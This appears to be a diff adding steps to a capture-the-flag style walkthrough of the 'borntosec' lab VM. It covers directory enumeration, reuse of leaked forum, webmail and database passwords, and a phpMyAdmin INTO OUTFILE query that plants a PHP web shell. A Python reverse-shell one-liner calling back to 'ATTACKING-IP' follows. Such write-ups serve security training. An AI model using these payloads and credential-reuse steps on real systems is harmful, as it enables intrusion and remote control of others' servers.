@@ -131,7 +131,8 @@ We can see that there is some important directories like :
 
 > /forum
 
-But we don't have permission to access /forum on this server with http, 
+But we don't have permission to access /forum on this server with http, And as wen now we have also the `https:443` port so 
+we try to `Dirsearch` with the https on `https://10.12.100.74/`, and this is what we got.
 
 ```
 ./dirsearch.py -u https://10.12.100.74
@@ -161,3 +162,71 @@ Target: https://10.12.100.74/
 Task Completed
 ```
 
+in the ` https://10.12.100.74/forum/` we found a subject named `Probleme login ?` and the author is `lmezard`.
+
+on this subject, we found a logs repports, after read this logs we found that  a password: `!q\]Ej?*5K5cy*AJ`
+
+this password is used to connect with the forum account. After  some search on the forum we found an email on `lmezard` profile  `laurie@borntosec.net`,
+
+> https://10.12.100.74/webmail
+
+we try to connect on the webmail page using  `laurie@borntosec.net` with the same password, and it's successful.
+After login we found two emails, one of theme was `DB Access`.
+
+```
+
+Hey Laurie,
+
+You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
+
+Best regards.
+```
+
+We use the username and password that we got on the email to connect the databases using:
+
+> https://10.12.100.74/phpmyadmin
+
+we use what call php reverse shell  to create a file in `https://10.12.100.74/forum/templates_c`, and we execute it on phpmyadmin SQL requites commande like this:
+
+```
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/tmp.php';
+nc -l 80
+https://url/forum/templates_c/tmp.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+this command let you use bash in this machine and then i found a file in /home/LOOKATME/password contain this password `_lmezard:G!@M6f4Eatau{sF"_`
+
+For `templates_c` folder we founde it with `Dirsearch` :
+
+```
+./dirsearch.py -u https://10.12.100.74/forum
+
+  _|. _ _  _  _  _ _|_    v0.4.2.4
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11308
+
+Output File: /goinfre/ybolles/ybolles2root/dirsearch/reports/10.12.100.74/_forum_22-05-25_15-36-47.txt
+
+Target: https://10.12.100.74/forum/
+
+[15:36:47] Starting:
+[15:37:16] 200 -    1KB - /forum/images/
+[15:37:16] 301 -  321B  - /forum/images  ->  https://10.12.100.74/forum/images/
+[15:37:16] 301 -  323B  - /forum/includes  ->  https://10.12.100.74/forum/includes/
+[15:37:16] 200 -    5KB - /forum/includes/
+[15:37:16] 200 -    5KB - /forum/index.php
+[15:37:16] 200 -    5KB - /forum/index
+[15:37:17] 200 -    5KB - /forum/index.php/login/
+[15:37:18] 200 -    2KB - /forum/js/
+[15:37:18] 301 -  319B  - /forum/lang  ->  https://10.12.100.74/forum/lang/
+[15:37:22] 200 -    2KB - /forum/modules/
+[15:37:22] 301 -  322B  - /forum/modules  ->  https://10.12.100.74/forum/modules/
+[15:37:38] 200 -    6KB - /forum/templates_c/
+[15:37:38] 301 -  326B  - /forum/templates_c  ->  https://10.12.100.74/forum/templates_c/
+[15:37:39] 301 -  321B  - /forum/themes  ->  https://10.12.100.74/forum/themes/
+[15:37:39] 200 -  925B  - /forum/themes/
+[15:37:40] 301 -  321B  - /forum/update  ->  https://10.12.100.74/forum/update/
+
+Task Completed
+```
